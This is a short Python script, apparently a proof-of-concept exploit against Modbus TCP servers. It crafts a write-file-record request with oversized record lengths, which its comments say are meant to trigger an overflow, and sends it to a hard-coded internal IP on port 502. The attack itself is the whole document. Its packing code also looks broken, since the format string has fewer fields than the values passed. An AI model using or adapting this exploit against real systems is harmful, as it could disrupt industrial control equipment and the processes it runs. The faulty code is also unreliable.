import socket
from scapy.all import *
import logging

logging.basicConfig(level=logging.DEBUG)

def create_exploit_packet():
    # Modbus TCP header
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = 0x0014  # Adjusted length for additional payload
    unit_id = 0x01

    # Modbus function code and payload
    function_code = 0x15  # Example function code
    reference_type = 0x06  # Correct reference type for file record request
    file_number = 0x0001
    record_number = 0x0000
    record_length_1 = 0xfffe  # First record length to trigger overflow
    record_length_2 = 0xfffb  # Second record length to continue the loop

    # Construct the payload
    payload = struct.pack('>BHHHBHHH', function_code, reference_type, file_number, record_number, record_length_1, 0xFF, reference_type, file_number, record_number, record_length_2)

    # Construct the Modbus TCP packet
    modbus_packet = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + payload

    return modbus_packet

def send_modbus_request():
    try:
        modbus_request = create_exploit_packet()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.103.152.8', 502))
        logging.info("Connected to server.")
        
        s.send(modbus_request)
        logging.debug('Sent Modbus request: %s', repr(modbus_request))
        
        response = s.recv(1024)
        logging.debug('Received response: %s', repr(response))
        
        s.close()
        logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_modbus_request()
